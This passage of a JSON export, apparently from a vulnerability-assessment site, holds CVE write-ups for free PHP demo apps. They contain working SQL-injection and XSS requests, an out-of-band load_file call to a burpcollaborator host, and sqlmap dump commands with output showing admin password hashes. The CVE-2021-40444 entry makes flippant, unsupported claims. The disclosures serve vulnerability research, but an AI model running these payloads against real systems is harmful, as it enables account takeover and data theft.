      "revisionDate": "2021-09-27T14:44:47.166805Z",
      "document": "## [CVE-2021-40444](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40444)\r\n\r\n## Vulnerability: \r\n- `Microsoft MSHTML Remote Code Execution Vulnerability`\r\n- Tested with malicious `.exe` file \r\n\r\n## Executive Summary:\r\n\r\nMicrosoft is investigating reports of a remote code execution vulnerability in MSHTML that affects Microsoft Windows. Microsoft is aware of targeted attacks that attempt to exploit this vulnerability by using specially-crafted Microsoft Office documents.\r\n\r\nAn attacker could craft a malicious ActiveX control to be used by a Microsoft Office document that hosts the browser rendering engine. The attacker would then have to convince the user to open the malicious document. Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with administrative user rights.\r\n\r\nMicrosoft Defender Antivirus and Microsoft Defender for Endpoint both provide detection and protections for the known vulnerability. Customers should keep antimalware products up to date. Customers who utilize automatic updates do not need to take additional action. Enterprise customers who manage updates should select the detection build 1.349.22.0 or newer and deploy it across their environments. Microsoft Defender for Endpoint alerts will be displayed as: \u201cSuspicious Cpl File Execution\u201d.\r\n\r\nUpon completion of this investigation, Microsoft will take the appropriate action to help protect our customers. This may include providing a security update through our monthly release process or providing an out-of-cycle security update, depending on customer needs.\r\n\r\nPlease see the Mitigations and Workaround sections for important information about steps you can take to protect your system from this vulnerability.\r\n\r\nUPDATE September 14, 2021: Microsoft has released security updates to address this vulnerability. Please see the Security Updates table for the applicable update for your system. We recommend that you install these updates immediately. Please see the FAQ for important information about which updates are applicable to your system.\r\n\r\n--------------------------------------------------------------------------------------------------------------------\r\n\r\n## Conclusion:\r\n- Security is not checked\r\n- Just OPEN :D\r\n\r\n## Risk Assessment:\r\n- This may well be a meterpreter malicious backdoor shell file\r\n- This may well be a malicious MSI package or hidden bat file\r\n\r\n## Status:\r\n- Low(Medium)\r\n  \r\n## Fixed\r\n- Windows 11\r\n\r\n## Source:\r\n[href](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-40444)\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-mitre/edit/main/CVE-2021-40444)\r\n\r\n## Demo docx:\r\n[href](https://streamable.com/2qa8ff)\r\n\r\n## Demo VLC:\r\n[href](https://streamable.com/gh2jio)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "cff40c37-1078-4116-abe0-33d2e6ce2985",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "a2c0fb81-b0c3-4850-9393-e52427779fbf",
      "created": "2021-09-24T03:58:34.054572Z",
      "revisionDate": "2021-09-29T21:20:05.926528Z",
      "document": "This assessment has moved to the [Rapid7 analysis](https://attackerkb.com/topics/15E0q0tdEZ/cve-2021-22005/rapid7-analysis). Thank you.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "2acf94e1-ec0a-4719-b871-53908deb76a5",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "9805fc0e-076f-48a5-980b-3dbd1e6f116b",
      "created": "2021-09-26T06:16:59.955832Z",
      "revisionDate": "2021-09-26T06:16:59.952236Z",
      "document": "## [CVE-nu11-06-092421](https://www.sourcecodester.com/php/14928/patient-appointment-scheduler-system-using-php-free-source-code.html)\r\n\r\n### Description:\r\nThe PASS-PHP (by: oretnom23 ) v1.0 is vulnerable to remote SQL-Injection bypass Authentication, XSS-Stored, and PHPSESSID Hijacking.\r\nThe vulnerable app: to remote SQL - injection bypass Authentication is \"login.php\", with parameters: \"username\" and \"password\".\r\nAfter the successful PWNED of the credentials for the admin account, the malicious user can be storing an XSS payload, whit who can take the active PHPSESSID\r\nevery time when he wants to log in to the system with an admin account by using this exploit.\r\n\r\n-----------------------------------------------------------------------------------------------\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/oretnom23/CVE-nu11-06-092421)\r\n\r\n## Proof:\r\n[href](https://streamable.com/1o87sl)",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b6200175-5c6b-41ad-9019-95983caab057",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "94231d22-e275-422d-8ce1-7ab32bd31743",
      "created": "2021-09-26T06:33:01.596772Z",
      "revisionDate": "2021-09-26T06:33:01.590927Z",
      "document": "## [CVE-nu11-16-092421](https://www.sourcecodester.com/php/14868/banking-system-using-php-free-source-code.html)\r\n\r\n### Description:\r\nThe OBS-PHP(by:oretnom23)v1.0 is vulnerable to remote SQL-Injection bypass Authentication, XSS-Stored, and PHPSESSID Hijacking.\r\nThe vulnerable app: to remote SQL - injection bypass Authentication is \"login.php\", with parameters: \"username\" and \"password\".\r\nAfter the successful PWNED of the credentials for the admin account, the malicious user can be storing an XSS payload, whit who can take the active PHPSESSID\r\nevery time when he wants to log in to the system with an admin account by using this exploit.\r\n\r\n### Reproduce: [href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/oretnom23/CVE-nu11-16-092421)\r\n\r\n### Proof: [href](https://streamable.com/41ibvc)\r\n\r\n### BR nu11secur1ty",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3b9655c3-1c6f-4468-b028-f05a93bd9703",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "9d9e6c7e-e2f8-494f-b5cc-87109b552533",
      "created": "2021-09-28T10:05:09.632367Z",
      "revisionDate": "2021-09-29T02:07:44.782093Z",
      "document": "## [CVE-2021-36621](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36621)\r\n## [Vendor](https://www.sourcecodester.com/php/14847/online-covid-vaccination-scheduler-system-php-free-source-code.html)\r\n\r\nhttps://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-18-09-2821/screen.PNG\r\n\r\n## Description\r\nSourcecodester Online Covid Vaccination Scheduler System 1.0 is vulnerable to SQL Injection, XSS-STORED PHPSESSID Hijacking, and remote SQL Injection - bypass Authentication.\r\nThe attacker can be hijacking the PHPSESSID by using this vulnerability and then he can log in to the system and exploit the admin account.\r\nNext, exploitation: For MySQL vulnerability, the username parameter is vulnerable to time-based SQL injection. Upon successful dumping the admin password hash, \r\nan attacker can decrypt and obtain the plain-text password. Hence, the attacker could authenticate as an Administrator.\r\n\r\n## Request MySQL:\r\n```bash\r\nGET /scheduler/addSchedule.php?lid=(select%20load_file('%5c%5c%5c%5ciugn0izvyx9wrtoo6c6oo16xeokh87wyymp9fx4.burpcollaborator.net%5c%5cgfd'))&d= HTTP/1.1\r\nHost: localhost\r\nCookie: PHPSESSID=30nmu0cj0blmnevrj5arrk8hh3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n\r\n## Respond MySQL:\r\n```bash\r\nHTTP/1.1 200 OK\r\nDate: Tue, 28 Sep 2021 11:17:00 GMT\r\nServer: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.22\r\nX-Powered-By: PHP/7.4.22\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: 5045\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<style>\r\n#uni_modal .modal-content>.modal-header,#uni_modal .modal-content>.modal-footer{\r\ndisplay:none;\r\n}\r\n#uni_modal .modal-body{\r\npadding-top:0 !important;\r\n}\r\n#location_modal{\r\ndirect\r\n...[SNIP]...\r\n```\r\n## Live test: \r\n```url\r\nhttp://localhost/scheduler/addSchedule.php?lid=(select%20load_file(%27%5c%5c%5c%5ciugn0izvyx9wrtoo6c6oo16xeokh87wyymp9fx4.burpcollaborator.net%5c%5cgfd%27))\r\n```\r\n- proof: https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-18-09-2821/docs/scheduler-CVE-Critical.gif\r\n\r\n-----------------------------------------------------------------------------------------------------------------------------------------\r\n\r\n## Request XSS:\r\n```bash\r\nGET /scheduler/addSchedule.php?lid=5&d=v6qfw%3cscript%3ealert(1)%3c%2fscript%3eytpic HTTP/1.1\r\nHost: localhost\r\nCookie: PHPSESSID=30nmu0cj0blmnevrj5arrk8hh3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n## Respond XSS:\r\n```bash\r\nHTTP/1.1 200 OK\r\nDate: Tue, 28 Sep 2021 11:16:57 GMT\r\nServer: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.22\r\nX-Powered-By: PHP/7.4.22\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: 4576\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<style>\r\n#uni_modal .modal-content>.modal-header,#uni_modal .modal-content>.modal-footer{\r\ndisplay:none;\r\n}\r\n#uni_modal .modal-body{\r\npadding-top:0 !important;\r\n}\r\n#location_modal{\r\ndirect\r\n...[SNIP]...\r\n<h3>Schedule Form: (v6qfw<script>alert(1)</script>ytpic)</h3>\r\n...[SNIP]...\r\n```\r\n-----------------------------------------------------------------------------------------------------------\r\n## Live test: \r\n- proof: https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/oretnom23/CVE-nu11-18-09-2821/docs/XSS.gif\r\n\r\n-----------------------------------------------------------------------------------------------------------\r\n\r\n## PoC:\r\n```mysql\r\npython sqlmap.py python C:\\Users\\venvaropt\\Desktop\\CVE\\sqlmap\\sqlmap.py -u \"http://localhost/scheduler/classes/Login.php?f=login\" --data=\"username=admin&password=nu11secur1ty\" --cookie=\"PHPSESSID=30nmu0cj0blmnevrj5arrk8hh3\" --batch --answers=\"crack=N,dict=N,continue=Y,quit=N\" -D scheduler -T users -C username,password --dump\r\n```\r\n## OUTPUT:\r\n```cmd\r\nPOST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\r\nsqlmap identified the following injection point(s) with a total of 157 HTTP(s) requests:\r\n---\r\nParameter: username (POST)\r\n    Type: time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\r\n    Payload: username=admin' AND (SELECT 9211 FROM (SELECT(SLEEP(5)))oCqY) AND 'giEC'='giEC&password=nu11secur1ty\r\n---\r\n[19:49:38] [INFO] the back-end DBMS is MySQL\r\n[19:49:38] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions\r\ndo you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y\r\nweb application technology: PHP 7.4.22, Apache 2.4.48\r\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\r\n[19:49:43] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'scheduler'\r\n[19:49:43] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'scheduler'\r\n[19:49:43] [INFO] retrieved: 1\r\n[19:49:49] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)\r\n[19:49:56] [INFO] adjusting time delay to 1 second due to good response times\r\n0192023a7bbd73250516f069df18b500\r\n[19:51:46] [INFO] retrieved: admin\r\n[19:52:02] [INFO] recognized possible password hashes in column 'password'\r\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N\r\ndo you want to crack them via a dictionary-based attack? [Y/n/q] N\r\nDatabase: scheduler\r\nTable: users\r\n[1 entry]\r\n+----------+----------------------------------+\r\n| username | password                         |\r\n+----------+----------------------------------+\r\n| admin    | 0192023a7bbd73250516f069df18b500 |\r\n+----------+----------------------------------+\r\n\r\n[19:52:02] [INFO] table 'scheduler.users' dumped to CSV file 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\localhost\\dump\\scheduler\\users.csv'\r\n[19:52:02] [INFO] fetched data logged to text files under 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\localhost'\r\n\r\n[*] ending @ 19:52:02 /2021-09-28/\r\n\r\n\r\nC:\\Users\\venvaropt\\Desktop\\scheduler-CVE-Critical-CVE-18-09-2821>\r\n```\r\n-----------------------------------------------------------------------------------------------------------\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/edit/main/vendors/oretnom23/CVE-nu11-18-09-2821)\r\n\r\n## Proof:\r\n[href](https://streamable.com/zcp31i)",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c540c49c-80f8-41d2-9f17-55699f6bbfb2",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "adf2f078-1d52-4dd5-a446-a0db77d0d614",
      "created": "2021-09-28T22:44:54.817582Z",
      "revisionDate": "2021-09-28T23:24:31.118447Z",
      "document": "All exploits linked except the gist one have artifacts (`3D` and `\\n`) making it unusable so use the gist cleaned version.\r\n\r\nTo patch update to v2.8+.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "0d2854aa-5ed7-4b86-81a1-6a39b7a02f75",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "428669f6-0263-4244-947f-1c6111abef71",
      "created": "2021-09-28T23:24:00.029107Z",
      "revisionDate": "2021-09-28T23:24:00.030218Z",
      "document": "Patch : update to OTRS 6.0.2 to fix this specific issue but updating to 6.0.32 is recommended.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "34fc825b-68ed-4ddb-be80-625db9d804df",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "8b155ea3-2d1c-433f-9cfa-c99339b8612c",
      "created": "2021-09-29T12:43:39.426883Z",
      "revisionDate": "2021-10-13T00:08:24.998064Z",
      "document": "## [CVE-nu11-17-092921](https://www.sourcecodester.com/php/14964/try-my-recipe-recipe-sharing-website-cms-php-and-sqlite-free-source-code.html)\r\n## [Vendor](https://www.sourcecodester.com/users/tips23)\r\n![logo](https://raw.githubusercontent.com/nu11secur1ty/CVE-nu11secur1ty/main/vendors/oretnom23/CVE-nu11-17-092921/docs/view_recipe_content.png)\r\n\r\n## MySQL Vulnerability Description:\r\nThe `cid` parameter appears on Recipe Sharing Website - CMS (by:oretnom23) to be vulnerable to SQL injection attacks. The payloads 12345678' or '7775'='7775 and 77335599' or '5533'='5577 were each submitted in the `cid` parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way.\r\nThe attacker can dump information about users and their passwords. Then he can take control of their accounts.\r\n\r\n- MySQL Request:\r\n\r\n```cmd\r\nGET /recipe_site/?page=recipe&cid=12345678'%20or%20'7775'%3d'7775 HTTP/1.1\r\nHost: 192.168.1.180\r\nCookie: PHPSESSID=v4f40h5nvo41f7t5j0jg8f7pvd\r\nUpgrade-Insecure-Requests: 1\r\nReferer: http://192.168.1.180/recipe_site/\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US,en-GB;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\r\nConnection: close\r\nCache-Control: max-age=0\r\n```\r\n\r\n- MySQL Response:\r\n\r\n```cmd\r\nHTTP/1.1 200 OK\r\nDate: Wed, 29 Sep 2021 07:50:44 GMT\r\nServer: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/7.4.22\r\nX-Powered-By: PHP/7.4.22\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate\r\nPragma: no-cache\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 13306\r\n\r\n<br />\r\n<b>Warning</b>: SQLite3::exec(): database is locked in <b>C:\\xampp\\htdocs\\recipe_site\\DBConnection.php</b> on line <b>76</b><br />\r\n<br />\r\n<b>Warning</b>: SQLite3::exec(): database is locked i\r\n...[SNIP]...\r\n<div class=\"item col wow bounceInUp\">\r\n...[SNIP]...\r\n<div class=\"card shadow-sm \">\r\n...[SNIP]...\r\n<div class=\"card-body \">\r\n...[SNIP]...\r\n<h5 class=\"card-title mb-1\">Sample Recipe 102</h5>\r\n...[SNIP]...\r\n<hr class=\"bg-primary opacity-100\">\r\n...[SNIP]...\r\n<p class=\"truncate-3 fw-light fst-italic lh-1\" title=\"Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Etiam hendrerit tellus in nisi semper vulputate. Curabitur accumsan metus sit amet erat volutpat, pl\r\n...[SNIP]...\r\n<div class=\"w-100 d-flex justify-content-end\">\r\n...[SNIP]...\r\n<div class=\"col-auto flex-grow-1\">\r\n...[SNIP]...\r\n<div class=\"text-muted truncate-1\" title=\"Claire Blake\">\r\n...[SNIP]...\r\n<div class=\"col-auto\">\r\n...[SNIP]...\r\n<a href=\"./?page=view_recipe&rid=2\" class=\"btn btn-sm btn-primary bg-gradient rounded-0 py-0\">View Recipes</a>\r\n...[SNIP]...\r\n<div class=\"item col wow bounceInUp\">\r\n...[SNIP]...\r\n<div class=\"card shadow-sm \">\r\n...[SNIP]...\r\n<div class=\"card-body \">\r\n...[SNIP]...\r\n<h5 class=\"card-title mb-1\">Sample Menu</h5>\r\n...[SNIP]...\r\n<hr class=\"bg-primary opacity-100\">\r\n...[SNIP]...\r\n<p class=\"truncate-3 fw-light fst-italic lh-1\" title=\"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut vestibulum, magna sed porttitor venenatis, metus ex ornare arcu, non tincidunt orci lectus at odio. Proin elementum convallis leo at\r\n...[SNIP]...\r\n<div class=\"w-100 d-flex justify-content-end\">\r\n...[SNIP]...\r\n<div class=\"col-auto flex-grow-1\">\r\n...[SNIP]...\r\n<div class=\"text-muted truncate-1\" title=\"Try My Recipe Mgt\">\r\n...[SNIP]...\r\n<div class=\"col-auto\">\r\n...[SNIP]...\r\n<a href=\"./?page=view_recipe&rid=1\" class=\"btn btn-sm btn-primary bg-gradient rounded-0 py-0\">View Recipes</a>\r\n...[SNIP]...\r\n```\r\n\r\n- The PoC:\r\n\r\n```cmd\r\npython sqlmap.py -u \"http://192.168.1.180/recipe_site/?page=view_recipe&rid=2\" --data=\"username=PWNED&password=password\" --cookie=\"PHPSESSID=v4f40h5nvo41f7t5j0jg8f7pvd\" --batch --answers=\"crack=N,dict=N,continue=Y,quit=N\" --dump\r\n```\r\n- Output from the PoC:\r\n\r\n```cmd\r\n---\r\nParameter: rid (GET)\r\n    Type: boolean-based blind\r\n    Title: AND boolean-based blind - WHERE or HAVING clause\r\n    Payload: page=view_recipe&rid=2' AND 8223=8223 AND 'szHe'='szHe\r\n\r\n    Type: time-based blind\r\n    Title: SQLite > 2.0 AND time-based blind (heavy query)\r\n    Payload: page=view_recipe&rid=2' AND 9766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'pxtJ'='pxtJ\r\n\r\n    Type: UNION query\r\n    Title: Generic UNION query (NULL) - 11 columns\r\n    Payload: page=view_recipe&rid=-3970' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113,107,120,113,113)||CHAR(98,110,109,97,65,108,113,65,99,90,118,79,112,72,99,89,87,70,75,70,68,116,65,117,97,65,106,79,101,100,109,86,65,79,84,109,79,82,112,77)||CHAR(113,113,118,106,113),NULL,NULL,NULL,NULL-- Lafs\r\n---\r\n[15:54:52] [INFO] the back-end DBMS is SQLite\r\nweb application technology: PHP 7.4.22, Apache 2.4.48\r\nback-end DBMS: SQLite\r\n[15:54:52] [INFO] fetching tables for database: 'SQLite_masterdb'\r\n[15:54:52] [INFO] fetching columns for table 'admin_list'\r\n[15:54:52] [INFO] fetching entries for table 'admin_list'\r\n[15:54:52] [INFO] recognized possible password hashes in column 'password'\r\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N\r\ndo you want to crack them via a dictionary-based attack? [Y/n/q] N\r\nDatabase: <current>\r\nTable: admin_list\r\n[2 entries]\r\n+----------+------+--------+---------------+----------------------------------+-----------+---------------------+\r\n| admin_id | type | status | fullname      | password                         | username  | date_created        |\r\n+----------+------+--------+---------------+----------------------------------+-----------+---------------------+\r\n| 1        | 1    | 1      | Administrator | 0192023a7bbd73250516f069df18b500 | admin     | 2021-09-28 01:54:24 |\r\n| 2        | 2    | 1      | Mike Williams | a88df23ac492e6e2782df6586a0c645f | mwilliams | 2021-09-28 08:00:51 |\r\n+----------+------+--------+---------------+----------------------------------+-----------+---------------------+\r\n\r\n[15:54:52] [INFO] table 'SQLite_masterdb.admin_list' dumped to CSV file 'C:\\Users\\venvaropt\\AppData\\Local\\sqlmap\\output\\192.168.1.180\\dump\\SQLite_masterdb\\admin_list.csv'\r\n[15:54:52] [INFO] fetching columns for table 'comment_list'\r\n[15:54:52] [INFO] fetching entries for table 'comment_list'\r\n[15:54:52] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'\r\n[15:54:52] [INFO] fetching number of entries for table 'comment_list' in database 'SQLite_masterdb'\r\n[15:54:52] [INFO] resumed: 4\r\n[15:54:52] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval\r\n[15:54:52] [INFO] retrieved:\r\n[15:54:52] [WARNING] time-based comparison requires larger statistical model, please wait..................... (done)\r\n[15:54:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions\r\n\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] resumed: 2021-09-28 05:58:39\r\n[15:54:53] [INFO] resumed: This is only a sample comment 101\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] resumed: 3\r\n[15:54:53] [INFO] resumed: 2021-09-28 06:26:59\r\n[15:54:53] [INFO] resumed: Sample Comment 102\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] resumed: 1\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] resumed: 6\r\n[15:54:53] [INFO] resumed: 2021-09-28 07:32:49\r\n[15:54:53] [INFO] resumed: Test User Comment 101\r\n[15:54:53] [INFO] resumed: 2\r\n[15:54:53] [INFO] resumed: 3\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] retrieved:\r\n[15:54:53] [INFO] resumed: 7\r\n[15:54:53] [INFO] resumed: 2021-09-28 07:34:03\r\n[15:54:53] [INFO] resumed: test\r\n[15:54:53] [INFO] resumed: 2\r\n[15:54:53] [INFO] resumed: 1\r\nDatabase: <current>\r\nTable: comment_list\r\n[4 entries]\r\n+---------+-----------+------------+---------+-----------------------------------+---------------------+\r\n| user_id | recipe_id | comment_id | FOREIGN | message                           | date_created        |\r\n+---------+-----------+------------+---------+-----------------------------------+---------------------+\r\n| 1       | 1         | 1          | <blank> | This is only a sample comment 101 | 2021-09-28 05:58:39 |\r\n| 1       | 1         | 3          | <blank> | Sample Comment 102                | 2021-09-28 